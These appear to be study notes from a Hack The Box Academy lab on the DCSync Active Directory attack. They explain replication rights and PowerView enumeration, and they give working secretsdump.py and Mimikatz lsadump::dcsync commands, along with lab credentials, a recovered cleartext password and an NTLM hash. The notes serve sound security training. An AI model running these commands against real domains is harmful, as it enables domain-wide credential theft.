## 1. What is DCSync?

**DCSync** is an Active Directory attack technique that abuses the **Directory Replication Service Remote Protocol**.

Normally, Domain Controllers use replication to synchronize AD data with other Domain Controllers. With the appropriate replication permissions, an attacker can impersonate the behavior of a Domain Controller and request sensitive credential material from a DC.

### Core idea

```text
Attacker-controlled account
          │
          │ Replication rights
          ▼
   Domain Controller
          │
          │ DCSync request
          ▼
 NTLM hashes / Kerberos keys
```

The critical permission involved is:

```text
DS-Replication-Get-Changes-All
```

DCSync generally requires the account to have the necessary replication rights, including:

- **DS-Replication-Get-Changes**
    
- **DS-Replication-Get-Changes-All**
    

Domain/Enterprise Administrators and default domain administrators normally possess these privileges.

---

## 2. Why DCSync Is So Dangerous

Once an attacker controls an account with replication privileges, they can request credential information for domain accounts.

This can include:

- NTLM password hashes
    
- Kerberos keys
    
- Password history
    
- Reversibly encrypted passwords where configured
    

Therefore, compromising a user with DCSync privileges can become a **domain-wide credential compromise**.

### Attack-chain concept

```text
Initial User
     │
     ▼
ACL Abuse
     │
     ▼
Compromise privileged account
     │
     ▼
Replication Rights
     │
     ▼
DCSync
     │
     ├──► NTLM hashes
     ├──► Kerberos keys
     └──► Possible reversible passwords
```

---

# 3. Scenario Setup

The module uses the `INLANEFREIGHT.LOCAL` domain.

The Windows attack host is:

```text
ACADEMY-EA-MS01
```

The module specifies RDP access using:

```text
Username: htb-student
Password: Academy_student_AD!
```

For the Linux portion involving `secretsdump.py`, the module uses SSH to:

```text
172.16.5.225
```

with:

```text
Username: htb-student
Password: HTB_@cademy_stdnt!
```

The module notes that the attack could also potentially be performed entirely from Windows using a Windows build of `secretsdump`.

---

# 4. Identifying a DCSync Account

In the module, the account of interest is:

```text
adunn
```

The first step is to enumerate the account.

### PowerView

```powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

Important information returned includes:

```text
samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

The module uses the SID to determine whether `adunn` possesses replication rights.

---

# 5. Enumerating Replication Rights with PowerView

First store the user's SID:

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
```

Then query the domain object's ACL:

```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
? { ($_.ObjectAceType -match 'Replication-Get')} |
? {$_.SecurityIdentifier -match $sid} |
select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Important output

The module shows:

```text
ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes
```

and:

```text
ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes-All
```

It also shows:

```text
ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set
```

for the relevant security identifier.

### Remember

For DCSync, the two names you should immediately recognize are:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

**`DS-Replication-Get-Changes-All` is particularly important because it permits replication of secret domain data.**

---

# 6. DCSync Through ACL Abuse

An important point from the module is that replication rights don't necessarily have to belong directly to an already privileged account.

If an attacker has an ACL such as **WriteDACL** over an appropriate object, they may be able to modify permissions and grant replication rights to an account they control.

Conceptually:

```text
WriteDACL
   │
   ▼
Modify ACL
   │
   ▼
Grant replication rights
   │
   ▼
Controlled account
   │
   ▼
DCSync
```

This is why ACL enumeration is so important in Active Directory assessments.

---

# 7. Main Tools

The module demonstrates three approaches:

### Mimikatz

```text
mimikatz
```

### Invoke-DCSync

```text
Invoke-DCSync
```

### Impacket

```text
secretsdump.py
```

The module specifically demonstrates both **Impacket's `secretsdump.py`** and **Mimikatz**.

---

# 8. DCSync with secretsdump.py

The module uses:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Important flag

```text
-just-dc
```

This tells `secretsdump.py` to focus on extracting:

- NTLM hashes
    
- Kerberos keys
    

from the domain controller's directory data.

### Output concept

The tool eventually produces entries such as:

```text
inlanefreight.local\administrator:500:LMHASH:NTHASH:::
```

and:

```text
krbtgt:502:LMHASH:NTHASH:::
```

The module also demonstrates that reversible-encryption accounts can result in cleartext output.

---

# 9. Files Created by `-just-dc`

After running:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc ...
```

the module shows three files:

```text
inlanefreight_hashes.ntds
inlanefreight_hashes.ntds.cleartext
inlanefreight_hashes.ntds.kerberos
```

### What they contain

|File|Purpose|
|---|---|
|`.ntds`|NTLM/password hash data|
|`.ntds.kerberos`|Kerberos keys|
|`.ntds.cleartext`|Cleartext values for accounts using reversible encryption|

---

# 10. Useful secretsdump Flags

The module highlights several useful options.

### Only NTLM hashes

```bash
-just-dc-ntlm
```

### Only one user

```bash
-just-dc-user <USERNAME>
```

### Show password last-set information

```bash
-pwd-last-set
```

### Include password history

```bash
-history
```

### Check account status

```bash
-user-status
```

These options can be useful during authorized assessments and password-audit work.

---

# 11. Reversible Encryption

This is an important section.

The module explains that:

> **Reversible encryption does NOT mean the password is simply stored as plaintext.**

Instead, Active Directory can store the password using reversible encryption, and the necessary decryption material can be recovered by sufficiently privileged access.

### Why this matters

If an account has the appropriate setting enabled, `secretsdump.py` can potentially recover the password value during credential extraction.

---

# 12. Detecting Reversible Encryption

Using the built-in AD PowerShell cmdlet:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

The module identifies:

```text
SamAccountName : proxyagent
userAccountControl : 640
```

### PowerView method

```powershell
Get-DomainUser -Identity * |
? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
select samaccountname,useraccountcontrol
```

Example:

```text
samaccountname    useraccountcontrol
--------------   -----------------------------------------
proxyagent       ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

---

# 13. Cleartext Password Example

The module demonstrates:

```bash
cat inlanefreight_hashes.ntds.cleartext
```

Example output:

```text
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

### Important distinction

```text
Normal AD password storage
        ↓
One-way password representation

Reversible encryption enabled
        ↓
Recoverable encrypted password
        ↓
Privileged extraction/decryption
        ↓
Potential cleartext password
```

---

# 14. DCSync with Mimikatz

The module also demonstrates DCSync using:

```text
Mimikatz
```

An important requirement is that Mimikatz must run in the security context of an account that possesses the necessary DCSync privileges.

The module uses `runas.exe` to create a process using the `adunn` credentials:

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Then:

```text
Enter the password for INLANEFREIGHT\adunn:
```

---

# 15. Mimikatz DCSync Commands

Start Mimikatz:

```powershell
.\mimikatz.exe
```

Enable debug privilege:

```text
privilege::debug
```

Then perform DCSync against a specific account:

```text
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### Example output

The module demonstrates:

```text
Object RDN           : Administrator

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )

Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```

---

# 16. Mimikatz vs secretsdump

|Tool|Platform commonly used|Main purpose|
|---|---|---|
|**Mimikatz**|Windows|DCSync and credential operations|
|**secretsdump.py**|Linux/Windows|Extract NTLM hashes/Kerberos material|
|**Invoke-DCSync**|PowerShell|DCSync from PowerShell|

### Easy way to remember

```text
Windows
   └── Mimikatz
         └── lsadump::dcsync

Linux
   └── Impacket
         └── secretsdump.py
```

---

# 17. Important Flags to Memorize

```text
secretsdump.py

-just-dc
```

Extract NTLM hashes and Kerberos keys.

```text
-just-dc-ntlm
```

Only NTLM hashes.

```text
-just-dc-user <USERNAME>
```

Target a specific user.

```text
-pwd-last-set
```

Display password last-set information.

```text
-history
```

Include password history.

```text
-user-status
```

Include account status information.

These options are explicitly covered in the module.

---

# 18. ACL → DCSync Attack Chain

This is the **most important concept** to remember from the previous ACL module + this DCSync module:

```text
             ACL ABUSE
                 │
                 ▼
              wley
                 │
       ForceChangePassword
                 │
                 ▼
            damundsen
                 │
            GenericWrite
                 │
                 ▼
        Help Desk Level 1
                 │
        Nested Membership
                 ▼
     Information Technology
                 │
             GenericAll
                 │
                 ▼
               adunn
                 │
       DCSync Replication Rights
                 │
                 ▼
        Domain Controller
                 │
                 ▼
       NTLM / Kerberos Data
```

The previous ACL module describes this exact escalation path: `wley → damundsen → Help Desk Level 1 → Information Technology → adunn`.

---

# 19. Key Things to Memorize

### DCSync

> **DCSync abuses AD replication functionality to retrieve credential material from a Domain Controller.**

### Critical rights

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

### PowerView enumeration

```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs
```

Filter for:

```text
Replication-Get
```

### Impacket

```bash
secretsdump.py
```

### Important flags

```text
-just-dc
-just-dc-ntlm
-just-dc-user
-pwd-last-set
-history
-user-status
```

### Mimikatz

```text
privilege::debug
```

then:

```text
lsadump::dcsync
```

### Most important concept

```text
DCSync ≠ dumping a local SAM
```

DCSync abuses **Active Directory replication** to request credential data from a **Domain Controller**.

---

## 20. Quick Revision Sheet

```text
DCSync
│
├── Protocol
│   └── Directory Replication Service Remote Protocol
│
├── Target
│   └── Domain Controller
│
├── Critical permissions
│   ├── DS-Replication-Get-Changes
│   └── DS-Replication-Get-Changes-All
│
├── Enumeration
│   └── PowerView Get-ObjectAcl
│
├── Linux
│   └── secretsdump.py
│
├── Windows
│   └── Mimikatz
│
├── NTLM
│   └── -just-dc-ntlm
│
├── Specific account
│   └── -just-dc-user
│
└── Additional information
    ├── -pwd-last-set
    ├── -history
    └── -user-status
```

### 🖼️ Module visuals to keep with your notes

The original module contains visuals for **ADSI Edit replication permissions**, **reversible-encryption account configuration**, and the broader **BloodHound ACL/DCSync attack path**.

The BloodHound section from the preceding ACL module also shows the `wley → damundsen` `ForceChangePassword` relationship and the transitive path toward `adunn`'s DCSync rights.

**Bottom line:** memorize the two replication rights, how to enumerate them with PowerView, the `secretsdump.py` flags, and the Mimikatz `lsadump::dcsync` syntax.